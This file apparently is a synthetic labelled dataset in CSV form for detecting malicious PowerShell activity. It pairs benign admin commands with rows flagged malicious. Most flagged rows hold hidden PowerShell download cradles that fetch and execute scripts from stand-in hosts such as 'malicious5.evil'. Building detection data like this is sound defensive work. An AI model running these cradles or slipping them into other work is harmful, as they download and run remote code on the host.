@@ -1,0 +1,101 @@
+user,src_ip,log_source,indicator_id,malicious,commandline,scriptcontent
+jdoe,10.0.0.77,commandline,,false,netstat -ano,
+svc_backup,10.0.0.10,commandline,IOC_11,true,"powershell.exe -NoP -NonI -W Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://malicious11.evil/payload11.ps1')""",
+svc_backup,10.0.0.43,commandline,IOC_12,true,"powershell.exe -NoP -NonI -W Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://malicious12.evil/payload12.ps1')""",
+analyst,10.0.0.169,scriptcontent,IOC_18,true,,"Invoke-Expression (New-Object Net.WebClient).DownloadString(""http://malicious18.evil/payload18.ps1"")"
+jdoe,10.0.0.81,command_history,,false,"python.exe ""C:\Projects\tool.py""",
+svc_backup,10.0.0.169,command_history,,false,git status,
+itadmin,10.0.0.139,commandline,IOC_05,true,"powershell.exe -NoP -NonI -W Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://malicious5.evil/payload5.ps1')""",
+analyst,10.0.0.165,scriptcontent,IOC_08,true,,"Invoke-Expression (New-Object Net.WebClient).DownloadString(""http://malicious8.evil/payload8.ps1"")"
+jdoe,10.0.0.150,scriptcontent,IOC_01,true,,"Invoke-Expression (New-Object Net.WebClient).DownloadString(""http://malicious1.evil/payload1.ps1"")"
+analyst,10.0.0.201,command_history,,false,robocopy C:\Data \\fileserver\share /MIR,
+analyst,10.0.0.127,scriptcontent,IOC_06,true,,"Invoke-Expression (New-Object Net.WebClient).DownloadString(""http://malicious6.evil/payload6.ps1"")"
+itadmin,10.0.0.146,command_history,IOC_06,true,"IEX (New-Object Net.WebClient).DownloadString(""http://malicious6.evil/payload6.ps1"")",
+jdoe,10.0.0.165,commandline,IOC_17,true,"powershell.exe -NoP -NonI -W Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://malicious17.evil/payload17.ps1')""",
+itadmin,10.0.0.54,command_history,IOC_04,true,"IEX (New-Object Net.WebClient).DownloadString(""http://malicious4.evil/payload4.ps1"")",
+itadmin,10.0.0.138,command_history,,false,ping intranet.local,
+analyst,10.0.0.219,commandline,IOC_14,true,"powershell.exe -NoP -NonI -W Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://malicious14.evil/payload14.ps1')""",
+jdoe,10.0.0.134,scriptcontent,,false,,"Write-Host ""Script finished successfully."""
+itadmin,10.0.0.11,scriptcontent,,false,,"$files = Get-ChildItem -Path ""C:\Logs"" -Recurse"
+jdoe,10.0.0.184,scriptcontent,,false,,"Send-MailMessage -To ""admin@corp.local"" -Subject ""Job Complete"""
+analyst,10.0.0.170,commandline,IOC_08,true,"powershell.exe -NoP -NonI -W Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://malicious8.evil/payload8.ps1')""",
+itadmin,10.0.0.25,scriptcontent,IOC_20,true,,"Invoke-Expression (New-Object Net.WebClient).DownloadString(""http://malicious20.evil/payload20.ps1"")"
+jdoe,10.0.0.243,scriptcontent,,false,,"Import-Csv "".\users.csv"" | ForEach-Object { New-ADUser $_.Name }"
+svc_backup,10.0.0.198,scriptcontent,,false,,"Get-Service | Where-Object {$_.Status -eq ""Running""}"
+analyst,10.0.0.156,commandline,IOC_02,true,"powershell.exe -NoP -NonI -W Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://malicious2.evil/payload2.ps1')""",
+jdoe,10.0.0.243,command_history,IOC_18,true,"IEX (New-Object Net.WebClient).DownloadString(""http://malicious18.evil/payload18.ps1"")",
+analyst,10.0.0.238,scriptcontent,,false,,Get-ADUser -Filter * | Select-Object SamAccountName
+analyst,10.0.0.133,commandline,IOC_20,true,"powershell.exe -NoP -NonI -W Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://malicious20.evil/payload20.ps1')""",
+itadmin,10.0.0.159,commandline,,false,"powershell.exe -ExecutionPolicy Bypass -File ""C:\Scripts\backup.ps1""",
+svc_backup,10.0.0.127,command_history,IOC_19,true,"IEX (New-Object Net.WebClient).DownloadString(""http://malicious19.evil/payload19.ps1"")",
+jdoe,10.0.0.153,commandline,,false,netstat -ano,
+itadmin,10.0.0.142,scriptcontent,IOC_05,true,,"Invoke-Expression (New-Object Net.WebClient).DownloadString(""http://malicious5.evil/payload5.ps1"")"
+jdoe,10.0.0.96,command_history,,false,whoami /all,
+analyst,10.0.0.129,commandline,IOC_01,true,"powershell.exe -NoP -NonI -W Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://malicious1.evil/payload1.ps1')""",
+analyst,10.0.0.19,commandline,,false,wmic process list brief,
+itadmin,10.0.0.188,command_history,IOC_16,true,"IEX (New-Object Net.WebClient).DownloadString(""http://malicious16.evil/payload16.ps1"")",
+analyst,10.0.0.221,command_history,IOC_09,true,"IEX (New-Object Net.WebClient).DownloadString(""http://malicious9.evil/payload9.ps1"")",
+itadmin,10.0.0.104,command_history,IOC_12,true,"IEX (New-Object Net.WebClient).DownloadString(""http://malicious12.evil/payload12.ps1"")",
+analyst,10.0.0.239,scriptcontent,,false,,"Start-Transcript -Path ""C:\Logs\session.log"""
+analyst,10.0.0.52,command_history,IOC_17,true,"IEX (New-Object Net.WebClient).DownloadString(""http://malicious17.evil/payload17.ps1"")",
+jdoe,10.0.0.19,command_history,,false,"python.exe ""C:\Projects\tool.py""",
+jdoe,10.0.0.217,command_history,,false,netstat -ano,
+svc_backup,10.0.0.177,command_history,IOC_05,true,"IEX (New-Object Net.WebClient).DownloadString(""http://malicious5.evil/payload5.ps1"")",
+itadmin,10.0.0.162,commandline,,false,wmic process list brief,
+itadmin,10.0.0.194,commandline,,false,"python.exe ""C:\Projects\tool.py""",
+itadmin,10.0.0.25,commandline,IOC_03,true,"powershell.exe -NoP -NonI -W Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://malicious3.evil/payload3.ps1')""",
+itadmin,10.0.0.127,scriptcontent,IOC_09,true,,"Invoke-Expression (New-Object Net.WebClient).DownloadString(""http://malicious9.evil/payload9.ps1"")"
+itadmin,10.0.0.230,command_history,,false,whoami /all,
+jdoe,10.0.0.121,commandline,,false,schtasks.exe /Query,
+jdoe,10.0.0.52,command_history,IOC_08,true,"IEX (New-Object Net.WebClient).DownloadString(""http://malicious8.evil/payload8.ps1"")",
+jdoe,10.0.0.74,command_history,IOC_15,true,"IEX (New-Object Net.WebClient).DownloadString(""http://malicious15.evil/payload15.ps1"")",
+jdoe,10.0.0.221,command_history,IOC_20,true,"IEX (New-Object Net.WebClient).DownloadString(""http://malicious20.evil/payload20.ps1"")",
+analyst,10.0.0.86,scriptcontent,IOC_16,true,,"Invoke-Expression (New-Object Net.WebClient).DownloadString(""http://malicious16.evil/payload16.ps1"")"
+itadmin,10.0.0.205,commandline,IOC_04,true,"powershell.exe -NoP -NonI -W Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://malicious4.evil/payload4.ps1')""",
+jdoe,10.0.0.194,scriptcontent,,false,,"Start-Transcript -Path ""C:\Logs\session.log"""
+itadmin,10.0.0.125,scriptcontent,IOC_10,true,,"Invoke-Expression (New-Object Net.WebClient).DownloadString(""http://malicious10.evil/payload10.ps1"")"
+itadmin,10.0.0.205,scriptcontent,IOC_14,true,,"Invoke-Expression (New-Object Net.WebClient).DownloadString(""http://malicious14.evil/payload14.ps1"")"
+jdoe,10.0.0.163,commandline,,false,netstat -ano,
+jdoe,10.0.0.198,commandline,IOC_15,true,"powershell.exe -NoP -NonI -W Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://malicious15.evil/payload15.ps1')""",
+analyst,10.0.0.100,commandline,,false,git status,
+itadmin,10.0.0.60,command_history,IOC_13,true,"IEX (New-Object Net.WebClient).DownloadString(""http://malicious13.evil/payload13.ps1"")",
+jdoe,10.0.0.214,commandline,IOC_07,true,"powershell.exe -NoP -NonI -W Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://malicious7.evil/payload7.ps1')""",
+analyst,10.0.0.77,command_history,,false,cmd.exe /c dir C:\Logs,
+jdoe,10.0.0.77,scriptcontent,IOC_03,true,,"Invoke-Expression (New-Object Net.WebClient).DownloadString(""http://malicious3.evil/payload3.ps1"")"
+analyst,10.0.0.47,scriptcontent,IOC_04,true,,"Invoke-Expression (New-Object Net.WebClient).DownloadString(""http://malicious4.evil/payload4.ps1"")"
+analyst,10.0.0.219,command_history,IOC_07,true,"IEX (New-Object Net.WebClient).DownloadString(""http://malicious7.evil/payload7.ps1"")",
+svc_backup,10.0.0.163,command_history,,false,cmd.exe /c dir C:\Logs,
+svc_backup,10.0.0.195,scriptcontent,IOC_02,true,,"Invoke-Expression (New-Object Net.WebClient).DownloadString(""http://malicious2.evil/payload2.ps1"")"
+jdoe,10.0.0.181,command_history,,false,wmic process list brief,
+svc_backup,10.0.0.57,command_history,,false,robocopy C:\Data \\fileserver\share /MIR,
+jdoe,10.0.0.188,commandline,,false,schtasks.exe /Query,
+analyst,10.0.0.217,scriptcontent,,false,,"Write-Output ""Daily backup started."""
+itadmin,10.0.0.248,command_history,IOC_10,true,"IEX (New-Object Net.WebClient).DownloadString(""http://malicious10.evil/payload10.ps1"")",
+svc_backup,10.0.0.89,scriptcontent,IOC_12,true,,"Invoke-Expression (New-Object Net.WebClient).DownloadString(""http://malicious12.evil/payload12.ps1"")"
+analyst,10.0.0.245,scriptcontent,IOC_11,true,,"Invoke-Expression (New-Object Net.WebClient).DownloadString(""http://malicious11.evil/payload11.ps1"")"
+jdoe,10.0.0.132,command_history,IOC_02,true,"IEX (New-Object Net.WebClient).DownloadString(""http://malicious2.evil/payload2.ps1"")",
+analyst,10.0.0.66,commandline,IOC_06,true,"powershell.exe -NoP -NonI -W Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://malicious6.evil/payload6.ps1')""",
+itadmin,10.0.0.190,scriptcontent,IOC_07,true,,"Invoke-Expression (New-Object Net.WebClient).DownloadString(""http://malicious7.evil/payload7.ps1"")"
+itadmin,10.0.0.93,scriptcontent,,false,,"Write-Host ""Script finished successfully."""
+itadmin,10.0.0.48,scriptcontent,IOC_17,true,,"Invoke-Expression (New-Object Net.WebClient).DownloadString(""http://malicious17.evil/payload17.ps1"")"
+jdoe,10.0.0.165,command_history,IOC_01,true,"IEX (New-Object Net.WebClient).DownloadString(""http://malicious1.evil/payload1.ps1"")",
+svc_backup,10.0.0.123,scriptcontent,,false,,"Import-Csv "".\users.csv"" | ForEach-Object { New-ADUser $_.Name }"
+svc_backup,10.0.0.122,commandline,IOC_18,true,"powershell.exe -NoP -NonI -W Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://malicious18.evil/payload18.ps1')""",
+itadmin,10.0.0.55,commandline,IOC_09,true,"powershell.exe -NoP -NonI -W Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://malicious9.evil/payload9.ps1')""",
+analyst,10.0.0.75,scriptcontent,IOC_15,true,,"Invoke-Expression (New-Object Net.WebClient).DownloadString(""http://malicious15.evil/payload15.ps1"")"
+svc_backup,10.0.0.119,commandline,IOC_19,true,"powershell.exe -NoP -NonI -W Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://malicious19.evil/payload19.ps1')""",
+analyst,10.0.0.217,command_history,,false,ping intranet.local,
+itadmin,10.0.0.230,scriptcontent,IOC_13,true,,"Invoke-Expression (New-Object Net.WebClient).DownloadString(""http://malicious13.evil/payload13.ps1"")"
+analyst,10.0.0.136,command_history,,false,wmic process list brief,
+analyst,10.0.0.166,commandline,IOC_13,true,"powershell.exe -NoP -NonI -W Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://malicious13.evil/payload13.ps1')""",
+jdoe,10.0.0.93,command_history,,false,ping intranet.local,
+itadmin,10.0.0.51,commandline,IOC_16,true,"powershell.exe -NoP -NonI -W Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://malicious16.evil/payload16.ps1')""",
+svc_backup,10.0.0.36,commandline,,false,schtasks.exe /Query,
+svc_backup,10.0.0.224,command_history,,false,whoami /all,
+analyst,10.0.0.154,scriptcontent,IOC_19,true,,"Invoke-Expression (New-Object Net.WebClient).DownloadString(""http://malicious19.evil/payload19.ps1"")"
+jdoe,10.0.0.50,command_history,,false,netstat -ano,
+jdoe,10.0.0.114,commandline,IOC_10,true,"powershell.exe -NoP -NonI -W Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://malicious10.evil/payload10.ps1')""",
+svc_backup,10.0.0.196,command_history,IOC_03,true,"IEX (New-Object Net.WebClient).DownloadString(""http://malicious3.evil/payload3.ps1"")",
+jdoe,10.0.0.91,commandline,,false,"python.exe ""C:\Projects\tool.py""",
+itadmin,10.0.0.74,command_history,IOC_14,true,"IEX (New-Object Net.WebClient).DownloadString(""http://malicious14.evil/payload14.ps1"")",
+analyst,10.0.0.61,command_history,IOC_11,true,"IEX (New-Object Net.WebClient).DownloadString(""http://malicious11.evil/payload11.ps1"")",
